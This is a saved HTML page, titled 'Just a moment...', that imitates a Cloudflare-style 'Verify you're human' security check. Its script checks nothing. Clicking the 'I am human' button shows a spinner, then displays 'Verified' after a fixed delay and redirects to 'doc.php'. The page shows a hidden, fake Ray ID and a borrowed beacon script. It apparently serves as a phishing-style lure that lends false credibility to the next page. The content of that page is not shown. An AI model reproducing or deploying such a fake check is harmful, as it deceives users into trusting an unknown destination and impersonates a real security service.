<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Just a moment...</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{background:#f5f6fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{display:flex;border-radius:14px;overflow:hidden;width:500px;background:#fff;box-shadow:0 4px 8px rgba(0,0,0,.05),0 16px 48px rgba(0,0,0,.1)}
.lp{width:155px;flex-shrink:0;background:hsl(156,34%,14%);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px;padding:36px 18px;position:relative;overflow:hidden}
.lp::before{content:'';position:absolute;top:-50px;right:-50px;width:130px;height:130px;border-radius:50%;background:rgba(255,255,255,.05)}
.lp svg{width:32px;height:32px;color:#fff}
.lp-t{color:#fff;font-size:11px;font-weight:600;letter-spacing:2px;text-transform:uppercase;text-align:center;line-height:1.5}
.lp-s{font-size:10px;color:rgba(255,255,255,.4);letter-spacing:.5px}
.rp{flex:1;padding:36px 30px;display:flex;flex-direction:column;justify-content:center}
.ttl{font-size:18px;font-weight:700;color:#111;margin-bottom:6px;letter-spacing:-.3px}
.sub{font-size:13px;color:#aaa;margin-bottom:26px;line-height:1.5}
.btn{width:100%;padding:13px;background:#111;color:#fff;font-size:15px;font-weight:600;border:none;border-radius:9px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:background .18s;user-select:none}
.btn:hover{background:#222}
.btn.v{background:#f3f4f6;color:#888;cursor:default}
.btn.v:hover{background:#f3f4f6}
#sp{width:17px;height:17px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;display:none;flex-shrink:0}
.btn.v #sp{border-color:rgba(0,0,0,.1);border-top-color:#888}
.chk{display:none;flex-shrink:0}
.btn.v .chk{display:block}
@keyframes spin{to{transform:rotate(360deg)}}
.foot{margin-top:16px;font-size:11px;color:#ddd}
#rid{display:none}
</style>
<style type="text/css">
        #dse-quicksearchdiv * {
            box-sizing: content-box;
        }

        #dse-quicksearchdiv svg {
            box-sizing: content-box;
        }

        #dse-disabledpopup * {
            box-sizing: content-box;
        }

        #dse-search:before {
            left: -4px !important;
            top: 38% !important;
            height: 6px !important;
            width: 6px !important;
            border: 1px solid #484644 !important;
            border-right: none !important;
            border-top: none !important;
            content: ' ' !important;
            background: #484644 !important;
            position: absolute !important;
            transform: rotate(45deg) !important;
        }

        #dse-disabledpopup:before {
            left: -4px !important;
            top: 38% !important;
            height: 6px !important;
            width: 6px !important;
            border: 1px solid #484644 !important;
            border-right: none !important;
            border-top: none !important;
            content: ' ' !important;
            background: #484644 !important;
            position: absolute !important;
            transform: rotate(45deg) !important;
        }

        .topArrow #dse-search:before {
            left: 50% !important;
            top: -4px !important;
            height: 6px !important;
            width: 6px !important;
            border: 1px solid #484644 !important;
            border-top: none !important;
            border-left: none !important;
            content: ' ' !important;
            background: #484644 !important;
            position: absolute !important;
            transform: rotate(225deg) !important;
        }

        .topArrow #dse-disabledpopup:before {
            left: 50% !important;
            top: -4px !important;
            height: 6px !important;
            width: 6px !important;
            border: 1px solid #484644 !important;
            border-top: none !important;
            border-left: none !important;
            content: ' ' !important;
            background: #484644 !important;
            position: absolute !important;
            transform: rotate(225deg) !important;
        }

        #dse-disabledpopup:hover:before,
        #dse-search:hover:before,
        #dse-moreoptions:hover,
        #dse-search:hover,
        #dse-copy:hover,
        #dse-disabledpopup:hover,
        #dse-lookup:hover,
        #dse-disableFeature:hover {
            background-color: #666 !important;
        }

        #dse-disabledpopup:active:before,
        #dse-search:active:before,
        #dse-moreoptions:active,
        #dse-search:active,
        #dse-copy:active,
        #dse-disabledpopup:active,
        #dse-lookup:active,
        #dse-disableFeature:active {
            background-color: #666 !important;
        }
    </style></head>
<body>
<div class="card">
  <div class="lp">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
    <div class="lp-t">Human<br>Verify</div>
    <div class="lp-s">Secure</div>
  </div>
  <div class="rp">
    <div class="ttl">Verify you're human</div>
    <div class="sub">Quick security check required.</div>
    <div class="btn" id="tr">
      <div id="sp"></div>
      <svg class="chk" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
      <span id="tx">I am human</span>
    </div>
    <div class="foot">Ray ID: <span id="rid">UNK</span></div>
  </div>
</div>
    <script>
        document.getElementById("tr").addEventListener("click", function () {

    const sp = document.getElementById("sp");
    const tx = document.getElementById("tx");
    const btn = document.getElementById("tr");

    sp.style.display = "block";
    tx.textContent = "Verifying...";

    setTimeout(function(){

        sp.style.display = "none";
        btn.classList.add("v");
        tx.textContent = "Verified";

        setTimeout(function(){
            window.location.href = "doc.php";
        },500);

    },2000);

});
    </script>

<script defer="" src="./Just a moment..._files/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;7ad5e22862f34eae9d2fd795eec49e5a&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>


<div id="dse-quicksearch" style="position: fixed; z-index: 10000; display: none;">
    <div id="dse-disabledpopup" style="cursor: pointer;display: block;position: relative;width: fit-content;padding: 8px;line-height: 16px;border: 1px solid #666;border-radius: 6px;background-color: #484644;font-style: normal;font-weight: normal;color:  #fff;font-size: 13px;font-family: Roboto,Arial,Helvetica,sans-serif;box-shadow: 0px 3px 4px 0px rgba(0,0,0,.14);">
        <span style="
            float: left;
            padding: 0px 12px 0px 4px;
            ">
            You've turned off quick searches.
        </span>
        <span id="dse-undo" style="padding: 0px 4px 0px 8px;">
            <span style="
               width: 15px;
               height: 15px;
               float: left;
               ">
                <svg enable-background="new 0 0 16 16" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
                    <path d="m14.259 2.75c-1.159-1.16-2.688-1.744-4.207-1.743-1.52-.001-3.049.583-4.208 1.743l-2.843 2.827v-2.57c0-.552-.448-1-1-1h-.016c-.552 0-.984.448-.984 1v5c0 .552.432.993.984.993h5.016c.552 0 1-.441 1-.993s-.448-1-1-1h-2.601l2.859-2.843c.774-.773 1.779-1.156 2.793-1.157 1.014.001 2.019.384 2.793 1.157.772.774 1.155 1.778 1.156 2.793-.001 1.014-.384 2.019-1.157 2.793l-4.543 4.543c-.391.391-.391 1.024 0 1.414.391.391 1.024.391 1.414 0l4.543-4.543c1.16-1.159 1.743-2.688 1.742-4.207.002-1.52-.582-3.048-1.741-4.207z" fill="#fff"></path>
                    <path d="m0 0h16v16h-16z" fill="none"></path>
                </svg>
            </span>
            Undo
        </span>
    </div>
    <div id="dse-quicksearchdiv" style="display: inline-block;position: relative;height: 32px;border: 1px solid #666;border-radius: 6px;background-color: #484644; font-style: normal;font-weight: normal;color:  #fff;font-size: 13px;font-family: Roboto,Arial,Helvetica,sans-serif;box-shadow: 0px 3px 4px 0px rgba(0,0,0,.14);">
        <div id="dse-search" style="border-radius: 5px 0px 0px 5px;height:-webkit-fill-available;height:-moz-fit-content;float: left;line-height: 15px;text-align: center;cursor: pointer;box-sizing: border-box;">
            <span style="
               float: left;
               padding: 8px 12px 8px 8px;
               height: -webkit-fill-available;
               ">
                Web
                search
            </span>
        </div>
        <div style="        border-left: 1px solid #D2D0CE;
            float: left;
            margin: 0px;
            top: 0;
            height: 32px;
            "></div>
        <div style="height:-webkit-fill-available;height:-moz-fit-content;float: left;padding: 8px 12px 8px 12px;line-height: 15px;text-align: center;cursor: pointer;" id="dse-copy">
            Copy
        </div>
        <div style="        border-left: 1px solid #D2D0CE;
            height: 32px;
            float: left;
            margin: 0px;
            top: 0;
            "></div>
        <div id="dse-moreoptions" style="border-radius: 0px 5px 5px 0px;height:-webkit-fill-available;height:-moz-fit-content;width: 16px;float: left;padding: 8PX 8px 0px 8px;text-align: center; cursor: pointer;position: relative;">
            <span style="width: 16px;">
                <svg enable-background="new 0 0 16 16" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
                    <path d="m1.5 6.5c-.828 0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5 1.5-.672 1.5-1.5-.672-1.5-1.5-1.5zm6.5 0c-.828 0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5 1.5-.672 1.5-1.5-.672-1.5-1.5-1.5zm6.5 0c-.828 0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5 1.5-.672 1.5-1.5-.672-1.5-1.5-1.5z" fill="#fff"></path>
                    <path d="m0 0h16v16h-16z" fill="none"></path>
                </svg>
            </span>
        </div>
        <div>
            <span style="width: 160px;border: 1px solid #666;border-radius: 6px;position: absolute;top: 40px;left: 105px;box-shadow: 0px 3px 4px 0px rgba(0,0,0,.14);background-color: #484644;overflow: hidden;" id="dse-popup">
                <div style="padding: 8px 12px;line-height: 15px;font-size: 13px;cursor: pointer;text-align: left;" id="dse-lookup">
                    Define
                </div>
                <hr style="        border: 0.5px solid #D2D0CE;
                  margin: 0;
                  cursor: default;
                  height: 0px;
                  background-color: #3b3a39;">
                <div style="padding: 8px 12px;line-height: 15px;font-size: 13px;cursor: pointer;text-align: left;" id="dse-disableFeature">
                    Turn off quick searches
                </div>
            </span>
        </div>
    </div>


</div></body></html>
